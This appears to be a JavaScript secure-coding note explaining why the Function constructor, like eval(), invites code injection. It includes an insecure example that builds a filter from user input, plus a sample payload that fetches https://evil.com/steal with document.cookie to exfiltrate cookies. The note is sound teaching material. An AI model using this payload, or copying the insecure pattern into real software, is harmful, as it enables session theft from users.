// Never use the Function constructor to create a new function. eslint: no-new-func

// Why? Creating a function in this way evaluates a string similarly to eval(), which opens vulnerabilities.

// A constructor function in JavaScript is a regular function specifically designed to create and initialize new objects. It serves as a blueprint or template for creating multiple objects of the same type, each with its own set of properties and methods


// why 
// The this keyword inside the constructor function is bound to this newly created object.
// The constructor function's code is executed, typically assigning properties and methods to this.
    // Security vulnerabilities (similar to eval())
    // The Function constructor evaluates strings as code, making your application vulnerable to injection attacks.
    // If the string comes from user input, it could execute arbitrary code.

// ❌ Dangerous: user controls 'code'
// ❌ Insecure code
const userExpression = getUserInput(); // e.g., "item.price > 100"
const filter = new Function('item', `return ${userExpression};`);

// Usage
products.filter(filter);

// hacking input
"console.log('Hacked!'); fetch('https://evil.com/steal?cookie=' + document.cookie); return true;"


// code flow
    products.filter(item => {
  console.log('Hacked!');
  fetch('https://evil.com/steal?cookie=' + document.cookie);
  return true;
});


// Key Takeaway

    // Never use new Function() unless you fully control the code string.
    // Use regular functions, arrow functions, or higher-order functions instead.
    // If you need dynamic behavior, use safe parsers or mapping functions, not runtime code execution.
    //whitelist
    //Always use safe mappings, validation, or pre-defined callbacks for dynamic logic.